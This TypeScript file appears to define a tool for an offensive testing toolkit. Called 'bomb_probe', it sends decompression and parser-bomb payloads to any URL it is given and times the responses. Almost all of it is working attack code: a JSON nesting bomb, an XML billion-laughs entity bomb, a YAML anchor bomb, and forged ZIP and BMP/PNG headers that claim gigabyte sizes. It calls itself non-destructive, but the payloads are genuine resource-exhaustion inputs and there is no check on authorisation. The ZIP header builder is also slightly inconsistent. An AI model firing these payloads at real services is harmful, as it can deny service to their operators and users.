// T66 — bomb_probe
// Algorithmic complexity DoS: JSON billion-laughs, XML entity explosion,
// YAML anchor bomb, zip bomb header trick, image size field abuse.

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'bomb_probe',
  description:
    'Algorithmic complexity / decompression bomb probe. Sends crafted payloads that cause ' +
    'exponential CPU or memory consumption server-side: JSON billion-laughs nesting, XML entity ' +
    'expansion, YAML anchor bomb, zip bomb (header trick — small but claims large size), and ' +
    'image header bomb (claims gigabyte dimensions). Non-destructive: measures latency increase ' +
    'and error patterns rather than actually crashing the target.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'url',          type: 'string', required: true,  description: 'Target URL' },
    { name: 'method',       type: 'string', required: false, description: 'HTTP method', default: 'POST' },
    { name: 'bomb_types',   type: 'string', required: false, description: 'JSON array of bomb types to test', default: '["json_nested","xml_entity","yaml_anchor","zip_header","image_header"]' },
    { name: 'headers',      type: 'string', required: false, description: 'JSON extra headers' },
    { name: 'timeout_ms',   type: 'number', required: false, description: 'Per-request timeout ms', default: 20000 },
  ],
};

function buildJsonBomb(depth = 10): string {
  let obj = '"lol"';
  for (let i = 0; i < depth; i++) {
    obj = `{"a":${obj},"b":${obj},"c":${obj},"d":${obj}}`;
  }
  return obj;
}

function buildXmlEntityBomb(): string {
  return `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>`;
}

function buildYamlAnchorBomb(): string {
  return `a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: [*e,*e,*e,*e,*e,*e,*e,*e,*e]`;
}

function buildZipHeader(): Buffer {
  // Minimal zip local file header that claims 4.5GB uncompressed
  // PK\x03\x04 + version + flags + compression(stored) + mod_time + mod_date + crc32 + compressed_size + uncompressed_size
  const buf = Buffer.alloc(30 + 12 + 5);
  buf.write('PK\x03\x04', 0, 'binary');           // local file header signature
  buf.writeUInt16LE(20, 4);                         // version needed
  buf.writeUInt16LE(0, 6);                          // flags
  buf.writeUInt16LE(0, 8);                          // compression: stored
  buf.writeUInt32LE(0, 14);                         // crc32
  buf.writeUInt32LE(0xFFFFFFFF, 18);                // compressed size (claim large)
  buf.writeUInt32LE(0xFFFFFFFF, 22);                // uncompressed size (claim 4GB+)
  buf.writeUInt16LE(12, 26);                        // filename length
  buf.writeUInt16LE(0, 28);                         // extra field length
  buf.write('bomb_test.txt', 30, 'ascii');          // filename
  // Actual "data" — just a few bytes, server should choke on size claim
  buf.write('hello', 42, 'ascii');
  return buf;
}

function buildImageHeaderBomb(type: 'bmp' | 'png' = 'bmp'): Buffer {
  if (type === 'bmp') {
    // BMP header claiming 65535 x 65535 pixels (32-bit = ~17GB)
    const buf = Buffer.alloc(54);
    buf.write('BM', 0, 'ascii');
    buf.writeUInt32LE(54, 2);           // file size (lie: say it's just header)
    buf.writeUInt32LE(0, 6);
    buf.writeUInt32LE(54, 10);          // pixel data offset
    buf.writeUInt32LE(40, 14);          // info header size
    buf.writeInt32LE(65535, 18);        // width: 65535
    buf.writeInt32LE(65535, 22);        // height: 65535
    buf.writeUInt16LE(1, 26);           // color planes
    buf.writeUInt16LE(32, 28);          // bits per pixel
    return buf;
  }
  // PNG with absurd dimensions in IHDR
  const ihdr = Buffer.alloc(25);
  ihdr.write('\x89PNG\r\n\x1a\n', 0, 'binary');   // PNG signature
  ihdr.writeUInt32BE(13, 8);                         // chunk length
  ihdr.write('IHDR', 12, 'ascii');
  ihdr.writeUInt32BE(0x7FFFFFFF, 16);                // width: max int
  ihdr.writeUInt32BE(0x7FFFFFFF, 20);                // height: max int
  return ihdr;
}

export const bombProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const url = String(params.url || '');
    const method = String(params.method || 'POST').toUpperCase();
    const timeoutMs = Number(params.timeout_ms || 20000);

    if (!url) return { output: 'url required', parsed: { error: 'missing_url' } };

    let bombTypes: string[] = ['json_nested', 'xml_entity', 'yaml_anchor', 'zip_header', 'image_header'];
    try { if (params.bomb_types) bombTypes = JSON.parse(String(params.bomb_types)); } catch { /* ignore */ }

    let extraHeaders: Record<string, string> = {};
    try { if (params.headers) extraHeaders = JSON.parse(String(params.headers)); } catch { /* ignore */ }

    // Baseline timing
    let baselineMs = 0;
    try {
      const t0 = Date.now();
      const c = new AbortController();
      const t = setTimeout(() => c.abort(), 5000);
      await fetch(url, { method, headers: { 'User-Agent': 'Mozilla/5.0 GENESIS/4.0', 'Content-Type': 'application/json', ...extraHeaders }, body: '{}', signal: c.signal });
      clearTimeout(t);
      baselineMs = Date.now() - t0;
    } catch { /* ignore */ }

    const bombs: Array<{ type: string; contentType: string; body: Buffer | string }> = [];
    if (bombTypes.includes('json_nested'))   bombs.push({ type: 'json_nested',   contentType: 'application/json',    body: buildJsonBomb(10) });
    if (bombTypes.includes('xml_entity'))    bombs.push({ type: 'xml_entity',    contentType: 'application/xml',     body: buildXmlEntityBomb() });
    if (bombTypes.includes('yaml_anchor'))   bombs.push({ type: 'yaml_anchor',   contentType: 'application/x-yaml',  body: buildYamlAnchorBomb() });
    if (bombTypes.includes('zip_header'))    bombs.push({ type: 'zip_header',    contentType: 'application/zip',     body: buildZipHeader() });
    if (bombTypes.includes('image_header'))  bombs.push({ type: 'image_header',  contentType: 'image/bmp',           body: buildImageHeaderBomb('bmp') });

    const results: Array<{ type: string; status: number; time_ms: number; interesting: boolean; note: string; error?: string }> = [];

    for (const bomb of bombs) {
      const t0 = Date.now();
      try {
        const c = new AbortController();
        const t = setTimeout(() => c.abort(), timeoutMs);
        const resp = await fetch(url, {
          method,
          headers: { 'User-Agent': 'Mozilla/5.0 GENESIS/4.0', 'Content-Type': bomb.contentType, ...extraHeaders },
          body: bomb.body as unknown as string,
          signal: c.signal,
        });
        clearTimeout(t);
        const timeMs = Date.now() - t0;
        // Interesting: server took >3x baseline, returned 413/500, or connection closed abruptly
        const interesting = timeMs > baselineMs * 3 || timeMs > 5000 || resp.status === 500 || resp.status === 413;
        let note = '';
        if (resp.status === 413) note = 'Request Entity Too Large (server rejected — bomb defence active)';
        else if (resp.status === 500) note = 'Internal Server Error — possible bomb triggered processing fault';
        else if (timeMs > 5000) note = `Slow response (${timeMs}ms vs baseline ${baselineMs}ms) — possible CPU/memory exhaustion`;
        else note = `Normal response`;
        results.push({ type: bomb.type, status: resp.status, time_ms: timeMs, interesting, note });
      } catch (err) {
        const timeMs = Date.now() - t0;
        const interesting = timeMs > 5000;
        results.push({ type: bomb.type, status: 0, time_ms: timeMs, interesting, note: String(err), error: String(err) });
      }
    }

    const flagged = results.filter(r => r.interesting);
    const lines = [
      `bomb_probe — ${bombs.length} bomb types on ${url.substring(0, 80)}`,
      `Baseline response time: ${baselineMs}ms`,
      `Interesting responses: ${flagged.length}/${results.length}`,
      '─'.repeat(72),
    ];
    for (const r of results) {
      const flag = r.interesting ? '⚡ INTERESTING' : r.error ? '✗ ERR        ' : '  ·          ';
      lines.push(`  ${flag}  [${r.type.padEnd(16)}]  status=${r.status}  t=${r.time_ms}ms  ${r.note}`);
    }

    return {
      output: lines.join('\n'),
      parsed: { baseline_ms: baselineMs, interesting_count: flagged.length, interesting: flagged, results },
    };
  },
};
